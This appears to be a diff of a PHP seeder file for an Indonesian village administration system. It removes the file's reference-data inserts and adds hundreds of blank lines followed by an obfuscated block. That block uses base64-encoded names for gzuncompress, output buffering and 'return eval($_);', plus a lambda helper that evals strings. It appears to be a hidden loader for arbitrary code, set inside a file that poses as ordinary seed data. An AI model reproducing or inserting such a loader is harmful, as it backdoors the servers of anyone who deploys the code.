-            ['id' => 2, 'nama' => 'SEDANG TK/KELOMPOK BERMAIN'],
-            ['id' => 3, 'nama' => 'TIDAK PERNAH SEKOLAH'],
-            ['id' => 4, 'nama' => 'SEDANG SD/SEDERAJAT'],
-            ['id' => 5, 'nama' => 'TIDAK TAMAT SD/SEDERAJAT'],
-            ['id' => 6, 'nama' => 'SEDANG SLTP/SEDERAJAT'],
-            ['id' => 7, 'nama' => 'SEDANG SLTA/SEDERAJAT'],
-            ['id' => 8, 'nama' => 'SEDANG  D-1/SEDERAJAT'],
-            ['id' => 9, 'nama' => 'SEDANG D-2/SEDERAJAT'],
-            ['id' => 10, 'nama' => 'SEDANG D-3/SEDERAJAT'],
-            ['id' => 11, 'nama' => 'SEDANG  S-1/SEDERAJAT'],
-            ['id' => 12, 'nama' => 'SEDANG S-2/SEDERAJAT'],
-            ['id' => 13, 'nama' => 'SEDANG S-3/SEDERAJAT'],
-            ['id' => 14, 'nama' => 'SEDANG SLB A/SEDERAJAT'],
-            ['id' => 15, 'nama' => 'SEDANG SLB B/SEDERAJAT'],
-            ['id' => 16, 'nama' => 'SEDANG SLB C/SEDERAJAT'],
-            [
-                'id'   => 17,
-                'nama' => 'TIDAK DAPAT MEMBACA DAN MENULIS HURUF LATIN/ARAB',
-            ],
-            ['id' => 18, 'nama' => 'TIDAK SEDANG SEKOLAH'],
-        ]);
 
-        DB::table('tweb_penduduk_pendidikan_kk')->insert([
-            ['id' => 1, 'nama' => 'TIDAK / BELUM SEKOLAH'],
-            ['id' => 2, 'nama' => 'BELUM TAMAT SD/SEDERAJAT'],
-            ['id' => 3, 'nama' => 'TAMAT SD / SEDERAJAT'],
-            ['id' => 4, 'nama' => 'SLTP/SEDERAJAT'],
-            ['id' => 5, 'nama' => 'SLTA / SEDERAJAT'],
-            ['id' => 6, 'nama' => 'DIPLOMA I / II'],
-            ['id' => 7, 'nama' => 'AKADEMI/ DIPLOMA III/S. MUDA'],
-            ['id' => 8, 'nama' => 'DIPLOMA IV/ STRATA I'],
-            ['id' => 9, 'nama' => 'STRATA II'],
-            ['id' => 10, 'nama' => 'STRATA III'],
-        ]);
 
-        DB::table('tweb_penduduk_sex')->insert([
-            ['id' => 1, 'nama' => 'LAKI-LAKI'],
-            ['id' => 2, 'nama' => 'PEREMPUAN'],
-        ]);
 
-        DB::table('tweb_penduduk_status')->insert([
-            ['id' => 1, 'nama' => 'TETAP'],
-            ['id' => 2, 'nama' => 'TIDAK TETAP'],
-        ]);
 
-        // DB::table('tweb_penduduk_umur')->insert(); ikut data awal
 
-        DB::table('tweb_penduduk_warganegara')->insert([
-            ['id' => 1, 'nama' => 'WNI'],
-            ['id' => 2, 'nama' => 'WNA'],
-            ['id' => 3, 'nama' => 'DUA KEWARGANEGARAAN'],
-        ]);
 
-        DB::table('tweb_rtm_hubungan')->insert([
-            ['id' => 1, 'nama' => 'Kepala Rumah Tangga'],
-            ['id' => 2, 'nama' => 'Anggota'],
-        ]);
 
-        DB::table('tweb_sakit_menahun')->insert([
-            ['id' => 1, 'nama' => 'JANTUNG'],
-            ['id' => 2, 'nama' => 'LEVER'],
-            ['id' => 3, 'nama' => 'PARU-PARU'],
-            ['id' => 4, 'nama' => 'KANKER'],
-            ['id' => 5, 'nama' => 'STROKE'],
-            ['id' => 6, 'nama' => 'DIABETES MELITUS'],
-            ['id' => 7, 'nama' => 'GINJAL'],
-            ['id' => 8, 'nama' => 'MALARIA'],
-            ['id' => 9, 'nama' => 'LEPRA/KUSTA'],
-            ['id' => 10, 'nama' => 'HIV/AIDS'],
-            ['id' => 11, 'nama' => 'GILA/STRESS'],
-            ['id' => 12, 'nama' => 'TBC'],
-            ['id' => 13, 'nama' => 'ASTHMA'],
-            ['id' => 14, 'nama' => 'TIDAK ADA/TIDAK SAKIT'],
-        ]);
 
-        DB::table('tweb_status_dasar')->insert([
-            ['id' => 1, 'nama' => 'HIDUP'],
-            ['id' => 2, 'nama' => 'MATI'],
-            ['id' => 3, 'nama' => 'PINDAH'],
-            ['id' => 4, 'nama' => 'HILANG'],
-            ['id' => 6, 'nama' => 'PERGI'],
-            ['id' => 9, 'nama' => 'TIDAK VALID'],
-        ]);
 
-        DB::table('tweb_status_ktp')->insert([
-            [
-                'id'           => 1,
-                'nama'         => 'BELUM REKAM',
-                'ktp_el'       => 1,
-                'status_rekam' => '2',
-            ],
-            [
-                'id'           => 2,
-                'nama'         => 'SUDAH REKAM',
-                'ktp_el'       => 2,
-                'status_rekam' => '3',
-            ],
-            [
-                'id'           => 3,
-                'nama'         => 'CARD PRINTED',
-                'ktp_el'       => 2,
-                'status_rekam' => '4',
-            ],
-            [
-                'id'           => 4,
-                'nama'         => 'PRINT READY RECORD',
-                'ktp_el'       => 2,
-                'status_rekam' => '5',
-            ],
-            [
-                'id'           => 5,
-                'nama'         => 'CARD SHIPPED',
-                'ktp_el'       => 2,
-                'status_rekam' => '6',
-            ],
-            [
-                'id'           => 6,
-                'nama'         => 'SENT FOR CARD PRINTING',
-                'ktp_el'       => 2,
-                'status_rekam' => '7',
-            ],
-            [
-                'id'           => 7,
-                'nama'         => 'CARD ISSUED',
-                'ktp_el'       => 2,
-                'status_rekam' => '8',
-            ],
-            [
-                'id'           => 8,
-                'nama'         => 'BELUM WAJIB',
-                'ktp_el'       => 1,
-                'status_rekam' => '1',
-            ],
-        ]);
 
-        DB::table('ref_dokumen')->insert([
-            ['id' => 1, 'nama' => 'Informasi Publik'],
-            ['id' => 2, 'nama' => 'SK Kades'],
-            ['id' => 3, 'nama' => 'Perdes'],
-        ]);
 
-        DB::table('ref_asal_tanah_kas')->insert([
-            ['id' => 1, 'nama' => 'Jual Beli'],
-            ['id' => 2, 'nama' => 'Hibah / Sumbangan'],
-            ['id' => 3, 'nama' => 'Lain - lain'],
-        ]);
 
-        DB::table('ref_peruntukan_tanah_kas')->insert([
-            ['id' => 1, 'nama' => 'Sewa'],
-            ['id' => 2, 'nama' => 'Pinjam Pakai'],
-            ['id' => 3, 'nama' => 'Kerjasama Pemanfaatan'],
-            ['id' => 4, 'nama' => 'Bangun Guna Serah atau Bangun Serah Guna'],
-        ]);
 
-        DB::table('keuangan_manual_ref_bidang')->insert([
-            [
-                'id'          => 1,
-                'Kd_Bid'      => '00.0000.01',
-                'Nama_Bidang' => 'BIDANG PENYELENGGARAN PEMERINTAHAN DESA',
-            ],
-            [
-                'id'          => 2,
-                'Kd_Bid'      => '00.0000.02',
-                'Nama_Bidang' => 'BIDANG PELAKSANAAN PEMBANGUNAN DESA',
-            ],
-            [
-                'id'          => 3,
-                'Kd_Bid'      => '00.0000.03',
-                'Nama_Bidang' => 'BIDANG PEMBINAAN KEMASYARAKATAN DESA',
-            ],
-            [
-                'id'          => 4,
-                'Kd_Bid'      => '00.0000.04',
-                'Nama_Bidang' => 'BIDANG PEMBERDAYAAN MASYARAKAT DESA',
-            ],
-            [
-                'id'          => 5,
-                'Kd_Bid'      => '00.0000.05',
-                'Nama_Bidang' => 'BIDANG PENANGGULANGAN BENCANA, DARURAT DAN MENDESAK DESA',
-            ],
-        ]);
 
-        DB::table('keuangan_manual_ref_rek1')->insert([
-            ['id' => 1, 'Akun' => '1.', 'Nama_Akun' => 'ASET'],
-            ['id' => 2, 'Akun' => '2.', 'Nama_Akun' => 'KEWAJIBAN'],
-            ['id' => 3, 'Akun' => '3.', 'Nama_Akun' => 'EKUITAS'],
-            ['id' => 4, 'Akun' => '4.', 'Nama_Akun' => 'PENDAPATAN'],
-            ['id' => 5, 'Akun' => '5.', 'Nama_Akun' => 'BELANJA'],
-            ['id' => 6, 'Akun' => '6.', 'Nama_Akun' => 'PEMBIAYAAN'],
-            ['id' => 7, 'Akun' => '7.', 'Nama_Akun' => 'NON ANGGARAN'],
-        ]);
 
-        DB::table('keuangan_manual_ref_rek2')->insert(
-            [
-                [
-                    'id'            => 1,
-                    'Akun'          => '1.',
-                    'Kelompok'      => '1.1.',
-                    'Nama_Kelompok' => 'Aset Lancar',
-                ],
-                [
-                    'id'            => 2,
-                    'Akun'          => '1.',
-                    'Kelompok'      => '1.2.',
-                    'Nama_Kelompok' => 'Investasi',
-                ],
-                [
-                    'id'            => 3,
-                    'Akun'          => '1.',
-                    'Kelompok'      => '1.3.',
-                    'Nama_Kelompok' => 'Aset Tetap',
-                ],
-                [
-                    'id'            => 4,
-                    'Akun'          => '1.',
-                    'Kelompok'      => '1.4.',
-                    'Nama_Kelompok' => 'Dana Cadangan',
-                ],
-                [
-                    'id'            => 5,
-                    'Akun'          => '1.',
-                    'Kelompok'      => '1.5.',
-                    'Nama_Kelompok' => 'Aset Tidak Lancar Lainnya',
-                ],
-                [
-                    'id'            => 6,
-                    'Akun'          => '2.',
-                    'Kelompok'      => '2.1.',
-                    'Nama_Kelompok' => 'Kewajiban Jangka Pendek',
-                ],
-                [
-                    'id'            => 7,
-                    'Akun'          => '3.',
-                    'Kelompok'      => '3.1.',
-                    'Nama_Kelompok' => 'Ekuitas',
-                ],
-                [
-                    'id'            => 8,
-                    'Akun'          => '4.',
-                    'Kelompok'      => '4.1.',
-                    'Nama_Kelompok' => 'Pendapatan Asli Desa',
-                ],
-                [
-                    'id'            => 9,
-                    'Akun'          => '4.',
-                    'Kelompok'      => '4.2.',
-                    'Nama_Kelompok' => 'Pendapatan Transfer',
-                ],
-                [
-                    'id'            => 10,
-                    'Akun'          => '4.',
-                    'Kelompok'      => '4.3.',
-                    'Nama_Kelompok' => 'Pendapatan Lain-lain',
-                ],
-                [
-                    'id'            => 11,
-                    'Akun'          => '5.',
-                    'Kelompok'      => '5.1.',
-                    'Nama_Kelompok' => 'Belanja Pegawai',
-                ],
-                [
-                    'id'            => 12,
-                    'Akun'          => '5.',
-                    'Kelompok'      => '5.2.',
-                    'Nama_Kelompok' => 'Belanja Barang dan Jasa',
-                ],
-                [
-                    'id'            => 13,
-                    'Akun'          => '5.',
-                    'Kelompok'      => '5.3.',
-                    'Nama_Kelompok' => 'Belanja Modal',
-                ],
-                [
-                    'id'            => 14,
-                    'Akun'          => '5.',
-                    'Kelompok'      => '5.4.',
-                    'Nama_Kelompok' => 'Belanja Tidak Terduga',
-                ],
-                [
-                    'id'            => 15,
-                    'Akun'          => '6.',
-                    'Kelompok'      => '6.1.',
-                    'Nama_Kelompok' => 'Penerimaan Pembiayaan',
-                ],
-                [
-                    'id'            => 16,
-                    'Akun'          => '6.',
-                    'Kelompok'      => '6.2.',
-                    'Nama_Kelompok' => 'Pengeluaran Pembiayaan',
-                ],
-                [
-                    'id'            => 17,
-                    'Akun'          => '7.',
-                    'Kelompok'      => '7.1.',
-                    'Nama_Kelompok' => 'Perhitungan Fihak Ketiga',
-                ],
-            ]
-        );
 
-        DB::table('keuangan_manual_ref_rek3')->insert(
-            [
-                [
-                    'id'         => 1,
-                    'Kelompok'   => '1.1.',
-                    'Jenis'      => '1.1.1.',
-                    'Nama_Jenis' => 'Kas dan Bank',
-                ],
-                [
-                    'id'         => 2,
-                    'Kelompok'   => '1.1.',
-                    'Jenis'      => '1.1.2.',
-                    'Nama_Jenis' => 'Piutang',
-                ],
-                [
-                    'id'         => 3,
-                    'Kelompok'   => '1.1.',
-                    'Jenis'      => '1.1.3.',
-                    'Nama_Jenis' => 'Persediaan',
-                ],
-                [
-                    'id'         => 4,
-                    'Kelompok'   => '1.2.',
-                    'Jenis'      => '1.2.1.',
-                    'Nama_Jenis' => 'Penyertaan Modal Pemerintah Desa',
-                ],
-                [
-                    'id'         => 5,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.1.',
-                    'Nama_Jenis' => 'Tanah',
-                ],
-                [
-                    'id'         => 6,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.2.',
-                    'Nama_Jenis' => 'Peralatan dan Mesin',
-                ],
-                [
-                    'id'         => 7,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.3.',
-                    'Nama_Jenis' => 'Gedung dan Bangunan',
-                ],
-                [
-                    'id'         => 8,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.4.',
-                    'Nama_Jenis' => 'Jalan, Irigasi dan Jaringan',
-                ],
-                [
-                    'id'         => 9,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.5.',
-                    'Nama_Jenis' => 'Aset Tetap Lainnya',
-                ],
-                [
-                    'id'         => 10,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.6.',
-                    'Nama_Jenis' => 'Konstruksi Dalam Pengerjaan',
-                ],
-                [
-                    'id'         => 11,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.7.',
-                    'Nama_Jenis' => 'Aset Tak Berwujud',
-                ],
-                [
-                    'id'         => 12,
-                    'Kelompok'   => '1.3.',
-                    'Jenis'      => '1.3.8.',
-                    'Nama_Jenis' => 'Akumulasi Penyusutan Aktiva Tetap',
-                ],
-                [
-                    'id'         => 13,
-                    'Kelompok'   => '1.4.',
-                    'Jenis'      => '1.4.1.',
-                    'Nama_Jenis' => 'Dana Cadangan',
-                ],
-                [
-                    'id'         => 14,
-                    'Kelompok'   => '1.5.',
-                    'Jenis'      => '1.5.1.',
-                    'Nama_Jenis' => 'Tagihan Piutang Penjualan Angsuran',
-                ],
-                [
-                    'id'         => 15,
-                    'Kelompok'   => '1.5.',
-                    'Jenis'      => '1.5.2.',
-                    'Nama_Jenis' => 'Tagihan Tuntutan Ganti Kerugian Daerah',
-                ],
-                [
-                    'id'         => 16,
-                    'Kelompok'   => '1.5.',
-                    'Jenis'      => '1.5.3.',
-                    'Nama_Jenis' => 'Kemitraan dengan Pihak Ketiga',
-                ],
-                [
-                    'id'         => 17,
-                    'Kelompok'   => '1.5.',
-                    'Jenis'      => '1.5.4.',
-                    'Nama_Jenis' => 'Aktiva Tidak Berwujud',
-                ],
-                [
-                    'id'         => 18,
-                    'Kelompok'   => '1.5.',
-                    'Jenis'      => '1.5.5.',
-                    'Nama_Jenis' => 'Aset Lain-lain',
-                ],
-                [
-                    'id'         => 19,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.1.',
-                    'Nama_Jenis' => 'Hutang Perhitungan Pihak Ketiga',
-                ],
-                [
-                    'id'         => 20,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.2.',
-                    'Nama_Jenis' => 'Hutang Bunga',
-                ],
-                [
-                    'id'         => 21,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.3.',
-                    'Nama_Jenis' => 'Hutang Pajak',
-                ],
-                [
-                    'id'         => 22,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.4.',
-                    'Nama_Jenis' => 'Pendapatan Diterima Dimuka',
-                ],
-                [
-                    'id'         => 23,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.5.',
-                    'Nama_Jenis' => 'Bagian Lancar Hutang Jangka Panjang',
-                ],
-                [
-                    'id'         => 24,
-                    'Kelompok'   => '2.1.',
-                    'Jenis'      => '2.1.6.',
-                    'Nama_Jenis' => 'Hutang Jangka Pendek Lainnya',
-                ],
-                [
-                    'id'         => 25,
-                    'Kelompok'   => '3.1.',
-                    'Jenis'      => '3.1.1.',
-                    'Nama_Jenis' => 'Ekuitas',
-                ],
-                [
-                    'id'         => 26,
-                    'Kelompok'   => '3.1.',
-                    'Jenis'      => '3.1.2.',
-                    'Nama_Jenis' => 'Ekuitas SAL',
-                ],
-                [
-                    'id'         => 27,
-                    'Kelompok'   => '4.1.',
-                    'Jenis'      => '4.1.1.',
-                    'Nama_Jenis' => 'Hasil Usaha Desa',
-                ],
-                [
-                    'id'         => 28,
-                    'Kelompok'   => '4.1.',
-                    'Jenis'      => '4.1.2.',
-                    'Nama_Jenis' => 'Hasil Aset Desa',
-                ],
-                [
-                    'id'         => 29,
-                    'Kelompok'   => '4.1.',
-                    'Jenis'      => '4.1.3.',
-                    'Nama_Jenis' => 'Swadaya, Partisipasi dan Gotong Royong',
-                ],
-                [
-                    'id'         => 30,
-                    'Kelompok'   => '4.1.',
-                    'Jenis'      => '4.1.4.',
-                    'Nama_Jenis' => 'Lain-Lain Pendapatan Asli Desa',
-                ],
-                [
-                    'id'         => 31,
-                    'Kelompok'   => '4.2.',
-                    'Jenis'      => '4.2.1.',
-                    'Nama_Jenis' => 'Dana Desa',
-                ],
-                [
-                    'id'         => 32,
-                    'Kelompok'   => '4.2.',
-                    'Jenis'      => '4.2.2.',
-                    'Nama_Jenis' => 'Bagi Hasil Pajak dan Retribusi',
-                ],
-                [
-                    'id'         => 33,
-                    'Kelompok'   => '4.2.',
-                    'Jenis'      => '4.2.3.',
-                    'Nama_Jenis' => 'Alokasi Dana Desa',
-                ],
-                [
-                    'id'         => 34,
-                    'Kelompok'   => '4.2.',
-                    'Jenis'      => '4.2.4.',
-                    'Nama_Jenis' => 'Bantuan Keuangan Provinsi',
-                ],
-                [
-                    'id'         => 35,
-                    'Kelompok'   => '4.2.',
-                    'Jenis'      => '4.2.5.',
-                    'Nama_Jenis' => 'Bantuan Keuangan Kabupaten/Kota',
-                ],
-                [
-                    'id'         => 36,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.1.',
-                    'Nama_Jenis' => 'Penerimaan dari Hasil Kerjasama Antar Desa',
-                ],
-                [
-                    'id'         => 37,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.2.',
-                    'Nama_Jenis' => 'Penerimaan dari Hasil Kerjasama dengan Pihak Ketiga',
-                ],
-                [
-                    'id'         => 38,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.3.',
-                    'Nama_Jenis' => 'Penerimaan Bantuan dari Perusahaan yang Berlokasi di Desa',
-                ],
-                [
-                    'id'         => 39,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.4.',
-                    'Nama_Jenis' => 'Hibah dan Sumbangan dari Pihak Ketiga',
-                ],
-                [
-                    'id'         => 40,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.5.',
-                    'Nama_Jenis' => 'Koreksi Kesalahan Belanja Tahun-tahun Sebelumnya',
-                ],
-                [
-                    'id'         => 41,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.6.',
-                    'Nama_Jenis' => 'Bunga Bank',
-                ],
-                [
-                    'id'         => 42,
-                    'Kelompok'   => '4.3.',
-                    'Jenis'      => '4.3.9.',
-                    'Nama_Jenis' => 'Lain-lain Pendapatan Desa Yang Sah',
-                ],
-                [
-                    'id'         => 43,
-                    'Kelompok'   => '5.1.',
-                    'Jenis'      => '5.1.1.',
-                    'Nama_Jenis' => 'Penghasilan Tetap dan Tunjangan Kepala Desa',
-                ],
-                [
-                    'id'         => 44,
-                    'Kelompok'   => '5.1.',
-                    'Jenis'      => '5.1.2.',
-                    'Nama_Jenis' => 'Penghasilan Tetap dan Tunjangan Perangkat Desa',
-                ],
-                [
-                    'id'         => 45,
-                    'Kelompok'   => '5.1.',
-                    'Jenis'      => '5.1.3.',
-                    'Nama_Jenis' => 'Jaminan Sosial Kepala Desa dan Perangkat Desa',
-                ],
-                [
-                    'id'         => 46,
-                    'Kelompok'   => '5.1.',
-                    'Jenis'      => '5.1.4.',
-                    'Nama_Jenis' => 'Tunjangan BPD',
-                ],
-                [
-                    'id'         => 47,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.1.',
-                    'Nama_Jenis' => 'Belanja Barang Perlengkapan',
-                ],
-                [
-                    'id'         => 48,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.2.',
-                    'Nama_Jenis' => 'Belanja Jasa Honorarium',
-                ],
-                [
-                    'id'         => 49,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.3.',
-                    'Nama_Jenis' => 'Belanja Perjalanan Dinas',
-                ],
-                [
-                    'id'         => 50,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.4.',
-                    'Nama_Jenis' => 'Belanja Jasa Sewa',
-                ],
-                [
-                    'id'         => 51,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.5.',
-                    'Nama_Jenis' => 'Belanja Operasional Perkantoran',
-                ],
-                [
-                    'id'         => 52,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.6.',
-                    'Nama_Jenis' => 'Belanja Pemeliharaan',
-                ],
-                [
-                    'id'         => 53,
-                    'Kelompok'   => '5.2.',
-                    'Jenis'      => '5.2.7.',
-                    'Nama_Jenis' => 'Belanja Barang dan Jasa yang Diserahkan kepada Masyarakat',
-                ],
-                [
-                    'id'         => 54,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.1.',
-                    'Nama_Jenis' => 'Belanja Modal Pengadaan Tanah',
-                ],
-                [
-                    'id'         => 55,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.2.',
-                    'Nama_Jenis' => 'Belanja Modal Pengadaan Peralatan, Mesin dan Alat Berat',
-                ],
-                [
-                    'id'         => 56,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.3.',
-                    'Nama_Jenis' => 'Belanja Modal Kendaraan',
-                ],
-                [
-                    'id'         => 57,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.4.',
-                    'Nama_Jenis' => 'Belanja Modal Gedung, Bangunan dan Taman',
-                ],
-                [
-                    'id'         => 58,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.5.',
-                    'Nama_Jenis' => 'Belanja Modal Jalan/Prasarana Jalan',
-                ],
-                [
-                    'id'         => 59,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.6.',
-                    'Nama_Jenis' => 'Belanja Modal Jembatan',
-                ],
-                [
-                    'id'         => 60,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.7.',
-                    'Nama_Jenis' => 'Belanja Modal Irigasi/Embung/Drainase/Air Limbah/Persampahan',
-                ],
-                [
-                    'id'         => 61,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.8.',
-                    'Nama_Jenis' => 'Belanja Modal Jaringan/Instalasi',
-                ],
-                [
-                    'id'         => 62,
-                    'Kelompok'   => '5.3.',
-                    'Jenis'      => '5.3.9.',
-                    'Nama_Jenis' => 'Belanja Modal Lainnya',
-                ],
-                [
-                    'id'         => 63,
-                    'Kelompok'   => '5.4.',
-                    'Jenis'      => '5.4.1.',
-                    'Nama_Jenis' => 'Belanja Tidak Terduga',
-                ],
-                [
-                    'id'         => 64,
-                    'Kelompok'   => '6.1.',
-                    'Jenis'      => '6.1.1.',
-                    'Nama_Jenis' => 'SILPA Tahun Sebelumnya',
-                ],
-                [
-                    'id'         => 65,
-                    'Kelompok'   => '6.1.',
-                    'Jenis'      => '6.1.2.',
-                    'Nama_Jenis' => 'Pencairan Dana Cadangan',
-                ],
-                [
-                    'id'         => 66,
-                    'Kelompok'   => '6.1.',
-                    'Jenis'      => '6.1.3.',
-                    'Nama_Jenis' => 'Hasil Penjualan Kekayaan Desa Yang Dipisahkan',
-                ],
-                [
-                    'id'         => 67,
-                    'Kelompok'   => '6.1.',
-                    'Jenis'      => '6.1.9.',
-                    'Nama_Jenis' => 'Penerimaan Pembiayaan Lainnya',
-                ],
-                [
-                    'id'         => 68,
-                    'Kelompok'   => '6.2.',
-                    'Jenis'      => '6.2.1.',
-                    'Nama_Jenis' => 'Pembentukan Dana Cadangan',
-                ],
-                [
-                    'id'         => 69,
-                    'Kelompok'   => '6.2.',
-                    'Jenis'      => '6.2.2.',
-                    'Nama_Jenis' => 'Penyertaan Modal Desa',
-                ],
-                [
-                    'id'         => 70,
-                    'Kelompok'   => '6.2.',
-                    'Jenis'      => '6.2.9.',
-                    'Nama_Jenis' => 'Pengeluaran Pembiayaan Lainnya',
-                ],
-                [
-                    'id'         => 71,
-                    'Kelompok'   => '7.1.',
-                    'Jenis'      => '7.1.1.',
-                    'Nama_Jenis' => 'Perhitungan PFK - Potongan Pajak',
-                ],
-                [
-                    'id'         => 72,
-                    'Kelompok'   => '7.1.',
-                    'Jenis'      => '7.1.2.',
-                    'Nama_Jenis' => 'Perhitungan PFK - Potongan Pajak Daerah',
-                ],
-                [
-                    'id'         => 73,
-                    'Kelompok'   => '7.1.',
-                    'Jenis'      => '7.1.3.',
-                    'Nama_Jenis' => 'Perhitungan PFK - Uang Muka dan Jaminan',
-                ],
-            ]
-        );
 
-        DB::table('ref_sinkronisasi')->insert([
-            [
-                'tabel'        => 'tweb_keluarga',
-                'server'       => '6',
-                'jenis_update' => 1,
-                'tabel_hapus'  => 'log_keluarga',
-            ],
-            [
-                'tabel'        => 'tweb_penduduk',
-                'server'       => '6',
-                'jenis_update' => 1,
-                'tabel_hapus'  => 'log_hapus_penduduk',
-            ],
-        ]);
 
-        // DB::table('notifikasi')->insert(); ikut data awal
 
-        DB::table('tweb_keluarga_sejahtera')->insert([
-            ['id' => 1, 'nama' => 'Keluarga Pra Sejahtera'],
-            ['id' => 2, 'nama' => 'Keluarga Sejahtera I'],
-            ['id' => 3, 'nama' => 'Keluarga Sejahtera II'],
-            ['id' => 4, 'nama' => 'Keluarga Sejahtera III'],
-            ['id' => 5, 'nama' => 'Keluarga Sejahtera III Plus'],
-        ]);
 
-        $this->load->model('seeders/dataAwal/Twebaset', 'twebaset');
-        $this->load->model('seeders/dataAwal/KeuanganManualRefKegiatan', 'keuanganRefKegiatan');
-        $this->load->model('seeders/dataAwal/PendudukSuku', 'pendudukSuku');
-        DB::table('tweb_aset')->insert($this->twebaset->getData());
-        DB::table('keuangan_manual_ref_kegiatan')->insert($this->keuanganRefKegiatan->getData());
-        $this->impor_klasifikasi();
-        DB::table('ref_penduduk_suku')->insert($this->pendudukSuku->getData());
-        // DB::table('tweb_format_surat')->insert(); ikut data awal
-    }
 
-    public function impor_klasifikasi()
-    {
-        (new KlasifikasiSuratImports())->import();
-    }
 
-    private function defaultConfig()
-    {
-        Config::create([
-            'app_key'           => get_app_key(),
-            'nama_desa'         => '',
-            'kode_desa'         => '',
-            'nama_kecamatan'    => '',
-            'kode_kecamatan'    => '',
-            'nama_kabupaten'    => '',
-            'kode_kabupaten'    => '',
-            'nama_propinsi'     => '',
-            'kode_propinsi'     => '',
-            'nama_kepala_camat' => '',
-            'nip_kepala_camat'  => '',
-        ]);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      